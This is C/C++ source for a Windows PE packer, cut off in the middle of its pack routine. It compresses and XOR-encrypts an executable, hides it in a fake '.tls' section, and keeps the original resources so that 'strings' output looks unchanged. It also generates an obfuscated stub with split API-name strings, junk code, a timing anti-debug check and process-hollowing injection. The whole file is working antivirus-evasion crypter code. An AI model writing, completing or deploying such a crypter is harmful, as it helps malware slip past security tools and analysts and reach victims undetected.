#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <vector>
#include <string>
#include <fstream>
#include <iostream>
#include <time.h>

/* Compatible avec GCC 4.4.7 sur Windows 7 */

#pragma pack(push, 1)
struct PackedSection {
    DWORD magic;
    DWORD unpacked_size;
    DWORD packed_size;
    DWORD key[4];
};
#pragma pack(pop)

typedef LONG (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

DWORD generateObfuscatedMagic() {
    srand((unsigned int)(time(NULL) ^ GetTickCount()));
    return 0x12000000 | (rand() & 0x00FFFFFF);
}

void generateStubSource(const char* outputPath, const char* sectionName, DWORD magic) {
    FILE* f = fopen(outputPath, "w");
    if (!f) return;

    fprintf(f, "#include <windows.h>\n");
    fprintf(f, "#include <stdio.h>\n");
    fprintf(f, "#include <string.h>\n\n");

    fprintf(f, "#define S1 \"Cre\" \"ate\" \"Pro\" \"cess\" \"A\"\n");
    fprintf(f, "#define S2 \"Nt\" \"Unmap\" \"View\" \"Of\" \"Section\"\n");
    fprintf(f, "#define S3 \"ntd\" \"ll.\" \"dll\"\n\n");

    fprintf(f, "#pragma pack(push, 1)\n");
    fprintf(f, "struct PackedSection {\n");
    fprintf(f, "    DWORD magic;\n");
    fprintf(f, "    DWORD unpacked_size;\n");
    fprintf(f, "    DWORD packed_size;\n");
    fprintf(f, "    DWORD key[4];\n");
    fprintf(f, "};\n");
    fprintf(f, "#pragma pack(pop)\n\n");

    fprintf(f, "typedef LONG (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);\n\n");

    fprintf(f, "void decryptXOR(unsigned char* data, DWORD size, DWORD* key) {\n");
    fprintf(f, "    unsigned char* keyBytes = (unsigned char*)key;\n");
    fprintf(f, "    DWORD i;\n");
    fprintf(f, "    volatile int junk = 0;\n");
    fprintf(f, "    for (i = 0; i < size; i++) {\n");
    fprintf(f, "        if (junk > 1000000) break;\n");
    fprintf(f, "        data[i] ^= keyBytes[i %% 16];\n");
    fprintf(f, "        junk++;\n");
    fprintf(f, "    }\n");
    fprintf(f, "}\n\n");

    fprintf(f, "DWORD decompressRLE(unsigned char* input, DWORD inputSize, unsigned char* output, DWORD outputSize) {\n");
    fprintf(f, "    DWORD writePos = 0;\n");
    fprintf(f, "    DWORD readPos = 0;\n");
    fprintf(f, "    int i;\n");
    fprintf(f, "    volatile DWORD dummy = GetTickCount();\n");
    fprintf(f, "    while (readPos < inputSize && writePos < outputSize) {\n");
    fprintf(f, "        if (dummy == 0xFFFFFFFF) return 0;\n");
    fprintf(f, "        unsigned char current = input[readPos];\n");
    fprintf(f, "        if (current == 0xFF && readPos + 2 < inputSize) {\n");
    fprintf(f, "            unsigned char count = input[readPos + 1];\n");
    fprintf(f, "            if (count == 0) {\n");
    fprintf(f, "                output[writePos++] = 0xFF;\n");
    fprintf(f, "                readPos += 2;\n");
    fprintf(f, "            } else {\n");
    fprintf(f, "                unsigned char value = input[readPos + 2];\n");
    fprintf(f, "                for (i = 0; i < count && writePos < outputSize; i++) {\n");
    fprintf(f, "                    output[writePos++] = value;\n");
    fprintf(f, "                }\n");
    fprintf(f, "                readPos += 3;\n");
    fprintf(f, "            }\n");
    fprintf(f, "        } else {\n");
    fprintf(f, "            output[writePos++] = current;\n");
    fprintf(f, "            readPos++;\n");
    fprintf(f, "        }\n");
    fprintf(f, "    }\n");
    fprintf(f, "    return writePos;\n");
    fprintf(f, "}\n\n");

    fprintf(f, "int main(int argc, char* argv[]) {\n");
    fprintf(f, "    char exePath[MAX_PATH];\n");
    fprintf(f, "    volatile DWORD antiDebug = GetTickCount();\n");
    fprintf(f, "    GetModuleFileNameA(NULL, exePath, MAX_PATH);\n\n");

    fprintf(f, "    DWORD temp1 = 0, temp2 = 0;\n");
    fprintf(f, "    temp1 = GetCurrentProcessId();\n");
    fprintf(f, "    if (temp1 == 0) return 1;\n\n");

    fprintf(f, "    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\n");
    fprintf(f, "    if (hFile == INVALID_HANDLE_VALUE) return 1;\n\n");

    fprintf(f, "    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);\n");
    fprintf(f, "    if (!hMapping) { CloseHandle(hFile); return 1; }\n\n");

    fprintf(f, "    unsigned char* fileData = (unsigned char*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);\n");
    fprintf(f, "    if (!fileData) { CloseHandle(hMapping); CloseHandle(hFile); return 1; }\n\n");

    fprintf(f, "    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileData;\n");
    fprintf(f, "    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(fileData + dosHeader->e_lfanew);\n");
    fprintf(f, "    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);\n\n");

    fprintf(f, "    struct PackedSection* packedSec = NULL;\n");
    fprintf(f, "    unsigned char* packedData = NULL;\n");
    fprintf(f, "    int i;\n\n");

    fprintf(f, "    for (i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {\n");
    fprintf(f, "        temp2 = sections[i].Characteristics;\n");
    fprintf(f, "        if (sections[i].SizeOfRawData > 1000000) {\n");
    fprintf(f, "            struct PackedSection* testSec = (struct PackedSection*)(fileData + sections[i].PointerToRawData);\n");
    fprintf(f, "            if (testSec->magic == 0x%08lXUL) {\n", (unsigned long)magic);
    fprintf(f, "                packedSec = testSec;\n");
    fprintf(f, "                packedData = (unsigned char*)packedSec + sizeof(struct PackedSection);\n");
    fprintf(f, "                break;\n");
    fprintf(f, "            }\n");
    fprintf(f, "        }\n");
    fprintf(f, "    }\n\n");

    fprintf(f, "    if (!packedSec) {\n");
    fprintf(f, "        UnmapViewOfFile(fileData);\n");
    fprintf(f, "        CloseHandle(hMapping);\n");
    fprintf(f, "        CloseHandle(hFile);\n");
    fprintf(f, "        return 1;\n");
    fprintf(f, "    }\n\n");

    fprintf(f, "    DWORD tickDiff = GetTickCount() - antiDebug;\n");
    fprintf(f, "    if (tickDiff > 1000) return 1;\n\n");

    fprintf(f, "    unsigned char* decrypted = (unsigned char*)VirtualAlloc(NULL, packedSec->packed_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n");
    fprintf(f, "    unsigned char* decompressed = (unsigned char*)VirtualAlloc(NULL, packedSec->unpacked_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n\n");

    fprintf(f, "    if (!decrypted || !decompressed) {\n");
    fprintf(f, "        UnmapViewOfFile(fileData);\n");
    fprintf(f, "        CloseHandle(hMapping);\n");
    fprintf(f, "        CloseHandle(hFile);\n");
    fprintf(f, "        return 1;\n");
    fprintf(f, "    }\n\n");

    fprintf(f, "    memcpy(decrypted, packedData, packedSec->packed_size);\n");
    fprintf(f, "    decryptXOR(decrypted, packedSec->packed_size, packedSec->key);\n");
    fprintf(f, "    DWORD decompSize = decompressRLE(decrypted, packedSec->packed_size, decompressed, packedSec->unpacked_size);\n\n");

    fprintf(f, "    if (decompSize != packedSec->unpacked_size) {\n");
    fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
    fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
    fprintf(f, "        UnmapViewOfFile(fileData);\n");
    fprintf(f, "        CloseHandle(hMapping);\n");
    fprintf(f, "        CloseHandle(hFile);\n");
    fprintf(f, "        return 1;\n");
    fprintf(f, "    }\n\n");

    fprintf(f, "    IMAGE_DOS_HEADER* newDosHeader = (IMAGE_DOS_HEADER*)decompressed;\n");
    fprintf(f, "    IMAGE_NT_HEADERS* newNtHeaders = (IMAGE_NT_HEADERS*)(decompressed + newDosHeader->e_lfanew);\n\n");

    fprintf(f, "    char cmdLine[32768];\n");
    fprintf(f, "    strcpy(cmdLine, exePath);\n");
    fprintf(f, "    if (argc > 1) {\n");
    fprintf(f, "        for (i = 1; i < argc; i++) {\n");
    fprintf(f, "            strcat(cmdLine, \" \");\n");
    fprintf(f, "            strcat(cmdLine, argv[i]);\n");
    fprintf(f, "        }\n");
    fprintf(f, "    }\n\n");

    fprintf(f, "    STARTUPINFOA si;\n");
    fprintf(f, "    PROCESS_INFORMATION pi;\n");
    fprintf(f, "    memset(&si, 0, sizeof(si));\n");
    fprintf(f, "    memset(&pi, 0, sizeof(pi));\n");
    fprintf(f, "    si.cb = sizeof(si);\n\n");

    fprintf(f, "    char procName[50];\n");
    fprintf(f, "    strcpy(procName, S1);\n");
    fprintf(f, "    typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n");
    fprintf(f, "    pCreateProcessA myCreateProcess = (pCreateProcessA)GetProcAddress(GetModuleHandleA(\"kernel32.dll\"), procName);\n\n");

    fprintf(f, "    if (!myCreateProcess(exePath, cmdLine, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {\n");
    fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
    fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
    fprintf(f, "        UnmapViewOfFile(fileData);\n");
    fprintf(f, "        CloseHandle(hMapping);\n");
    fprintf(f, "        CloseHandle(hFile);\n");
    fprintf(f, "        return 1;\n");
    fprintf(f, "    }\n\n");

    fprintf(f, "    CONTEXT ctx;\n");
    fprintf(f, "    memset(&ctx, 0, sizeof(ctx));\n");
    fprintf(f, "    ctx.ContextFlags = CONTEXT_FULL;\n");
    fprintf(f, "    if (!GetThreadContext(pi.hThread, &ctx)) {\n");
    fprintf(f, "        TerminateProcess(pi.hProcess, 1);\n");
    fprintf(f, "        CloseHandle(pi.hThread);\n");
    fprintf(f, "        CloseHandle(pi.hProcess);\n");
    fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
    fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
    fprintf(f, "        UnmapViewOfFile(fileData);\n");
    fprintf(f, "        CloseHandle(hMapping);\n");
    fprintf(f, "        CloseHandle(hFile);\n");
    fprintf(f, "        return 1;\n");
    fprintf(f, "    }\n\n");

    fprintf(f, "    DWORD pebImageBase;\n");
    fprintf(f, "    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &pebImageBase, sizeof(DWORD), NULL);\n\n");

    fprintf(f, "    char ntdllName[20], unmapName[30];\n");
    fprintf(f, "    strcpy(ntdllName, S3);\n");
    fprintf(f, "    strcpy(unmapName, S2);\n");
    fprintf(f, "    HMODULE hNtdll = GetModuleHandleA(ntdllName);\n");
    fprintf(f, "    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, unmapName);\n");
    fprintf(f, "    if (NtUnmapViewOfSection) {\n");
    fprintf(f, "        NtUnmapViewOfSection(pi.hProcess, (PVOID)pebImageBase);\n");
    fprintf(f, "    }\n\n");

    fprintf(f, "    LPVOID newImageBase = VirtualAllocEx(pi.hProcess, \n");
    fprintf(f, "                                          (LPVOID)newNtHeaders->OptionalHeader.ImageBase,\n");
    fprintf(f, "                                          newNtHeaders->OptionalHeader.SizeOfImage,\n");
    fprintf(f, "                                          MEM_COMMIT | MEM_RESERVE,\n");
    fprintf(f, "                                          PAGE_EXECUTE_READWRITE);\n\n");

    fprintf(f, "    if (!newImageBase) {\n");
    fprintf(f, "        newImageBase = VirtualAllocEx(pi.hProcess, NULL,\n");
    fprintf(f, "                                       newNtHeaders->OptionalHeader.SizeOfImage,\n");
    fprintf(f, "                                       MEM_COMMIT | MEM_RESERVE,\n");
    fprintf(f, "                                       PAGE_EXECUTE_READWRITE);\n");
    fprintf(f, "    }\n\n");

    fprintf(f, "    if (!newImageBase) {\n");
    fprintf(f, "        TerminateProcess(pi.hProcess, 1);\n");
    fprintf(f, "        CloseHandle(pi.hThread);\n");
    fprintf(f, "        CloseHandle(pi.hProcess);\n");
    fprintf(f, "        VirtualFree(decrypted, 0, MEM_RELEASE);\n");
    fprintf(f, "        VirtualFree(decompressed, 0, MEM_RELEASE);\n");
    fprintf(f, "        UnmapViewOfFile(fileData);\n");
    fprintf(f, "        CloseHandle(hMapping);\n");
    fprintf(f, "        CloseHandle(hFile);\n");
    fprintf(f, "        return 1;\n");
    fprintf(f, "    }\n\n");

    fprintf(f, "    WriteProcessMemory(pi.hProcess, newImageBase, decompressed, \n");
    fprintf(f, "                       newNtHeaders->OptionalHeader.SizeOfHeaders, NULL);\n\n");

    fprintf(f, "    IMAGE_SECTION_HEADER* newSections = IMAGE_FIRST_SECTION(newNtHeaders);\n");
    fprintf(f, "    for (i = 0; i < newNtHeaders->FileHeader.NumberOfSections; i++) {\n");
    fprintf(f, "        if (newSections[i].SizeOfRawData > 0) {\n");
    fprintf(f, "            WriteProcessMemory(pi.hProcess,\n");
    fprintf(f, "                              (LPVOID)((DWORD)newImageBase + newSections[i].VirtualAddress),\n");
    fprintf(f, "                              decompressed + newSections[i].PointerToRawData,\n");
    fprintf(f, "                              newSections[i].SizeOfRawData,\n");
    fprintf(f, "                              NULL);\n");
    fprintf(f, "        }\n");
    fprintf(f, "    }\n\n");

    fprintf(f, "    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &newImageBase, sizeof(LPVOID), NULL);\n\n");

    fprintf(f, "    DWORD delta = (DWORD)newImageBase - newNtHeaders->OptionalHeader.ImageBase;\n");
    fprintf(f, "    if (delta != 0) {\n");
    fprintf(f, "        IMAGE_DATA_DIRECTORY relocDir = newNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];\n");
    fprintf(f, "        if (relocDir.Size > 0) {\n");
    fprintf(f, "            IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(decompressed + relocDir.VirtualAddress);\n");
    fprintf(f, "            DWORD j;\n");
    fprintf(f, "            while (reloc->VirtualAddress > 0) {\n");
    fprintf(f, "                DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);\n");
    fprintf(f, "                WORD* relocData = (WORD*)((DWORD)reloc + sizeof(IMAGE_BASE_RELOCATION));\n");
    fprintf(f, "                for (j = 0; j < numEntries; j++) {\n");
    fprintf(f, "                    if ((relocData[j] >> 12) == IMAGE_REL_BASED_HIGHLOW) {\n");
    fprintf(f, "                        DWORD offset = reloc->VirtualAddress + (relocData[j] & 0xFFF);\n");
    fprintf(f, "                        DWORD relocAddr;\n");
    fprintf(f, "                        ReadProcessMemory(pi.hProcess, (LPVOID)((DWORD)newImageBase + offset), &relocAddr, sizeof(DWORD), NULL);\n");
    fprintf(f, "                        relocAddr += delta;\n");
    fprintf(f, "                        WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)newImageBase + offset), &relocAddr, sizeof(DWORD), NULL);\n");
    fprintf(f, "                    }\n");
    fprintf(f, "                }\n");
    fprintf(f, "                reloc = (IMAGE_BASE_RELOCATION*)((DWORD)reloc + reloc->SizeOfBlock);\n");
    fprintf(f, "            }\n");
    fprintf(f, "        }\n");
    fprintf(f, "    }\n\n");

    fprintf(f, "    ctx.Eax = (DWORD)newImageBase + newNtHeaders->OptionalHeader.AddressOfEntryPoint;\n");
    fprintf(f, "    SetThreadContext(pi.hThread, &ctx);\n\n");

    fprintf(f, "    ResumeThread(pi.hThread);\n\n");

    fprintf(f, "    VirtualFree(decrypted, 0, MEM_RELEASE);\n");
    fprintf(f, "    VirtualFree(decompressed, 0, MEM_RELEASE);\n");
    fprintf(f, "    UnmapViewOfFile(fileData);\n");
    fprintf(f, "    CloseHandle(hMapping);\n");
    fprintf(f, "    CloseHandle(hFile);\n\n");

    fprintf(f, "    WaitForSingleObject(pi.hProcess, INFINITE);\n");
    fprintf(f, "    DWORD exitCode = 0;\n");
    fprintf(f, "    GetExitCodeProcess(pi.hProcess, &exitCode);\n");
    fprintf(f, "    CloseHandle(pi.hThread);\n");
    fprintf(f, "    CloseHandle(pi.hProcess);\n\n");

    fprintf(f, "    return exitCode;\n");
    fprintf(f, "}\n");

    fclose(f);
}

class ResourcePreservingPacker {
private:
    std::vector<BYTE> inputFile;
    std::string inputPath;
    std::string outputPath;
    DWORD fileSize;
    char sectionName[9];
    DWORD magic;

    std::vector<BYTE> originalResourceData;
    IMAGE_SECTION_HEADER originalResourceSection;
    bool hasResources;

    bool extractOriginalResources() {
        hasResources = false;

        IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(&inputFile[0]);
        IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(&inputFile[0] + dosHeader->e_lfanew);
        IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);

        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (memcmp(sections[i].Name, ".tls", 4) == 0) {
                printf("[!] WARNING: Original file already has a .tls section!\n");
                printf("[!] This may cause conflicts. Consider using a different section name.\n");
            }

            if (memcmp(sections[i].Name, ".rsrc", 5) == 0) {
                printf("[*] Found .rsrc section in original file\n");
                printf("    Size: %lu bytes\n", (unsigned long)sections[i].SizeOfRawData);

                memcpy(&originalResourceSection, &sections[i], sizeof(IMAGE_SECTION_HEADER));

                originalResourceData.resize(sections[i].SizeOfRawData);
                memcpy(&originalResourceData[0],
                       &inputFile[0] + sections[i].PointerToRawData,
                       sections[i].SizeOfRawData);

                hasResources = true;
            }
        }

        if (!hasResources) {
            printf("[*] No .rsrc section found in original file\n");
        }

        return true;
    }

    bool compileStub(const std::string& stubExePath) {
        char tempPath[MAX_PATH];
        char stubSourcePath[MAX_PATH];
        char errorLogPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        sprintf(stubSourcePath, "%s\\stub_source.c", tempPath);
        sprintf(errorLogPath, "%s\\stub_compile_error.txt", tempPath);

        printf("[*] Generating obfuscated stub source code...\n");
        generateStubSource(stubSourcePath, sectionName, magic);

        HANDLE hTest = CreateFileA(stubSourcePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hTest == INVALID_HANDLE_VALUE) {
            fprintf(stderr, "[-] Failed to create stub source file\n");
            return false;
        }
        CloseHandle(hTest);

        char compileCmd[1024];
        sprintf(compileCmd, "gcc -std=c99 -O2 -s -o \"%s\" \"%s\" 2>\"%s\"",
                stubExePath.c_str(), stubSourcePath, errorLogPath);

        printf("[*] Compiling obfuscated unpacker stub...\n");
        int result = system(compileCmd);

        HANDLE hStub = CreateFileA(stubExePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        bool stubExists = (hStub != INVALID_HANDLE_VALUE);
        if (stubExists) CloseHandle(hStub);

        if (result != 0 || !stubExists) {
            fprintf(stderr, "[-] Failed to compile stub (exit code: %d)\n", result);

            FILE* errLog = fopen(errorLogPath, "r");
            if (errLog) {
                fprintf(stderr, "\n--- Compilation errors ---\n");
                char line[512];
                while (fgets(line, sizeof(line), errLog)) {
                    fprintf(stderr, "%s", line);
                }
                fclose(errLog);
                fprintf(stderr, "--- End of errors ---\n\n");
            }

            DeleteFileA(errorLogPath);
            return false;
        }

        DeleteFileA(stubSourcePath);
        DeleteFileA(errorLogPath);

        printf("[+] Obfuscated stub compiled successfully\n");
        return true;
    }

    std::vector<BYTE> compressRLE(const std::vector<BYTE>& input) {
        std::vector<BYTE> compressed;
        compressed.reserve(input.size());

        size_t i = 0;
        while (i < input.size()) {
            BYTE current = input[i];
            size_t count = 1;

            while (i + count < input.size() && input[i + count] == current && count < 255) {
                count++;
            }

            if (count > 3) {
                compressed.push_back(0xFF);
                compressed.push_back(static_cast<BYTE>(count));
                compressed.push_back(current);
                i += count;
            } else {
                for (size_t j = 0; j < count; j++) {
                    if (input[i] == 0xFF) {
                        compressed.push_back(0xFF);
                        compressed.push_back(0x00);
                    } else {
                        compressed.push_back(input[i]);
                    }
                    i++;
                }
            }
        }

        return compressed;
    }

    void encryptXOR(std::vector<BYTE>& data, const DWORD key[4]) {
        const BYTE* keyBytes = reinterpret_cast<const BYTE*>(key);
        size_t keyLen = 16;

        for (size_t i = 0; i < data.size(); i++) {
            data[i] ^= keyBytes[i % keyLen];
        }
    }

    static DWORD alignValue(DWORD value, DWORD alignment) {
        DWORD r = value % alignment;
        return r ? value + (alignment - r) : value;
    }

    bool injectPackedDataAndResources(const std::string& stubExePath,
                                      const std::vector<BYTE>& packedData,
                                      const std::string& outputPath) {
        std::ifstream stubFile(stubExePath.c_str(), std::ios::binary | std::ios::ate);
        if (!stubFile) {
            fprintf(stderr, "[-] Could not open stub file\n");
            return false;
        }

        std::streampos stubSizePos = stubFile.tellg();
        size_t stubSize = static_cast<size_t>(stubSizePos);
        stubFile.seekg(0, std::ios::beg);

        std::vector<BYTE> stubData(stubSize);
        stubFile.read(reinterpret_cast<char*>(&stubData[0]), stubSize);
        stubFile.close();

        IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(&stubData[0]);
        IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(&stubData[0] + dosHeader->e_lfanew);
        IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(ntHeaders);

        IMAGE_SECTION_HEADER* lastSection = &sections[ntHeaders->FileHeader.NumberOfSections - 1];

        std::vector<IMAGE_SECTION_HEADER> newSections;

        if (hasResources) {
            printf("[*] Injecting original .rsrc section...\n");
            IMAGE_SECTION_HEADER rsrcSection;
            memset(&rsrcSection, 0, sizeof(rsrcSection));
            memcpy(rsrcSection.Name, ".rsrc", 5);
            rsrcSection.Misc.VirtualSize = static_cast<DWORD>(originalResourceData.size());
            rsrcSection.VirtualAddress = alignValue(lastSection->VirtualAddress + lastSection->Misc.VirtualSize,
                                                   ntHeaders->OptionalHeader.SectionAlignment);
            rsrcSection.SizeOfRawData = alignValue(static_cast<DWORD>(originalResourceData.size()),
                                                  ntHeaders->OptionalHeader.FileAlignment);
            rsrcSection.PointerToRawData = alignValue(lastSection->PointerToRawData + lastSection->SizeOfRawData,
                                                     ntHeaders->OptionalHeader.FileAlignment);
            rsrcSection.Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;

            newSections.push_back(rsrcSection);
            lastSection = &newSections[0];
        }

        IMAGE_SECTION_HEADER packedSection;
        memset(&packedSection, 0, sizeof(packedSection));
        memcpy(packedSection.Name, sectionName, strlen(sectionName));
        packedSection.Misc.VirtualSize = static_cast<DWORD>(packedData.size());
        packedSection.VirtualAddress = alignValue(lastSection->VirtualAddress + lastSection->Misc.VirtualSize,
                                              ntHeaders->OptionalHeader.SectionAlignment);
        packedSection.SizeOfRawData = alignValue(static_cast<DWORD>(packedData.size()),
                                             ntHeaders->OptionalHeader.FileAlignment);
        packedSection.PointerToRawData = alignValue(lastSection->PointerToRawData + lastSection->SizeOfRawData,
                                                ntHeaders->OptionalHeader.FileAlignment);
        packedSection.Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;

        newSections.push_back(packedSection);

        int numNewSections = hasResources ? 2 : 1;
        ntHeaders->FileHeader.NumberOfSections = ntHeaders->FileHeader.NumberOfSections + numNewSections;

        IMAGE_SECTION_HEADER* finalSection = &newSections[newSections.size() - 1];
        ntHeaders->OptionalHeader.SizeOfImage = alignValue(finalSection->VirtualAddress + finalSection->Misc.VirtualSize,
                                                           ntHeaders->OptionalHeader.SectionAlignment);

        if (hasResources) {
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress =
                newSections[0].VirtualAddress;
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size =
                newSections[0].Misc.VirtualSize;
        }

        std::vector<BYTE> finalData;
        size_t sectionsOffset = dosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeaders->FileHeader.SizeOfOptionalHeader;

        finalData.insert(finalData.end(), stubData.begin(),
                        stubData.begin() + sectionsOffset + (ntHeaders->FileHeader.NumberOfSections - numNewSections) * sizeof(IMAGE_SECTION_HEADER));

        for (size_t i = 0; i < newSections.size(); i++) {
            finalData.insert(finalData.end(),
                           reinterpret_cast<BYTE*>(&newSections[i]),
                           reinterpret_cast<BYTE*>(&newSections[i]) + sizeof(IMAGE_SECTION_HEADER));
        }

        size_t afterSections = sectionsOffset + ntHeaders->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
        if (afterSections < stubData.size()) {
            finalData.insert(finalData.end(), stubData.begin() + afterSections, stubData.end());
        }

        if (hasResources) {
            while (finalData.size() < newSections[0].PointerToRawData) {
                finalData.push_back(0);
            }
            finalData.insert(finalData.end(), originalResourceData.begin(), originalResourceData.end());

            while (finalData.size() % ntHeaders->OptionalHeader.FileAlignment != 0) {
                finalData.push_back(0);
            }
        }

        DWORD packedOffset = hasResources ? newSections[1].PointerToRawData : newSections[0].PointerToRawData;
        while (finalData.size() < packedOffset) {
            finalData.push_back(0);
        }
        finalData.insert(finalData.end(), packedData.begin(), packedData.end());

        while (finalData.size() % ntHeaders->OptionalHeader.FileAlignment != 0) {
            finalData.push_back(0);
        }

        std::ofstream outFile(outputPath.c_str(), std::ios::binary);
        if (!outFile) {
            fprintf(stderr, "[-] Could not create output file\n");
            return false;
        }

        outFile.write(reinterpret_cast<char*>(&finalData[0]), finalData.size());
        outFile.close();

        return true;
    }

    bool processFile(const std::string& filePath) {
        std::ifstream file(filePath.c_str(), std::ios::binary | std::ios::ate);
        if (!file) {
            fprintf(stderr, "[-] Could not open input file\n");
            return false;
        }

        std::streampos fileSizePos = file.tellg();
        fileSize = static_cast<DWORD>(fileSizePos);
        file.seekg(0, std::ios::beg);

        inputFile.resize(fileSize);
        if (!file.read(reinterpret_cast<char*>(&inputFile[0]), fileSize)) {
            fprintf(stderr, "[-] Could not read input file\n");
            return false;
        }

        WORD mzSig = *reinterpret_cast<WORD*>(&inputFile[0]);
        if (mzSig != IMAGE_DOS_SIGNATURE) {
            fprintf(stderr, "[-] Invalid PE file!\n");
            return false;
        }

        IMAGE_DOS_HEADER* dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(&inputFile[0]);
        IMAGE_NT_HEADERS* ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(&inputFile[0] + dosHeader->e_lfanew);

        if (ntHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
            fprintf(stderr, "[-] Only 32-bit PE files are supported!\n");
            fprintf(stderr, "    Machine type: 0x%04X (expected 0x014C for x86)\n", ntHeaders->FileHeader.Machine);
            return false;
        }

        printf("[+] Found valid 32-bit PE file\n");
        return true;
    }

    void printBanner() {
        HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
        SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);

        printf("========================================================\n");
        printf("    PE PACKER - RESOURCE PRESERVATION EDITION\n");
        printf("      Original Resources + Obfuscated Packer\n");
        printf("       'strings' Output Matches Original\n");
        printf("========================================================\n\n");

        SetConsoleTextAttribute(hConsole, 7);
    }

public:
    ResourcePreservingPacker() : fileSize(0), hasResources(false) {
        memset(sectionName, 0, sizeof(sectionName));
        magic = 0;
    }

    bool parseArguments(int argc, char* argv[]) {
        if (argc < 2) {
            fprintf(stderr, "Usage: %s <input.exe> [OPTIONS]\n\n", argv[0]);
            printf("Options:\n");
            printf("  -o <file>         Specify output file\n\n");
            printf("Example: %s program.exe -o packed.exe\n", argv[0]);
            return false;
        }

        inputPath = argv[1];
        bool outputFlag = false;

        for (int i = 2; i < argc; i++) {
            std::string arg = argv[i];

            if (arg == "-o" && i + 1 < argc) {
                outputPath = argv[i + 1];
                outputFlag = true;
                i++;
            }
        }

        if (!outputFlag) {
            outputPath = inputPath;
            size_t extPos = outputPath.rfind(".exe");
            if (extPos != std::string::npos) {
                outputPath.replace(extPos, 4, "_packed.exe");
            } else {
                outputPath += "_packed.exe";
            }
        }

        return true;
    }

    bool pack() {
        printf("[*] Processing input file...\n");
        if (!processFile(inputPath)) {
            return false;
        }

        printf("[*] Original size: %lu bytes\n", (unsigned long)fileSize);

        extractOriginalResources();

        strcpy(sectionName, ".tls");
        printf("[*] Section name: %s\n", sectionName);

        magic = generateObfuscatedMagic();
        printf("[*] Generated magic: 0x%08lX\n", (unsigned long)magic);

        printf("[*] Compressing with RLE...\n");
        std::vector<BYTE> compressed = compressRLE(inputFile);
        printf("[+] Compressed: %lu bytes (%.1f%%)\n",
               (unsigned long)compressed.size(),
               (100.0 * compressed.size() / fileSize));

        DWORD randomKey[4];
        srand((unsigned int)(time(NULL) ^ GetTickCount()));
        for (int i = 0; i < 4; i++) {
            randomKey[i] = ((DWORD)rand() << 16) | (DWORD)rand();
        }

        printf("[*] Encrypting payload with random key...\n");
        encryptXOR(compressed, randomKey);
        printf("[+] Encryption complete\n");

        std::vector<BYTE> packedSectionData(sizeof(PackedSection) + compressed.size());
        PackedSection* section = reinterpret_cast<PackedSection*>(&packedSectionData[0]);

        section->magic = magic;
        section->unpacked_size = fileSize;
        section->packed_size = static_cast<DWORD>(compressed.size());
        memcpy(section->key, randomKey, sizeof(randomKey));

        memcpy(&packedSectionData[0] + sizeof(PackedSection),
               &compressed[0], compressed.size());

        char tempPath[MAX_PATH];
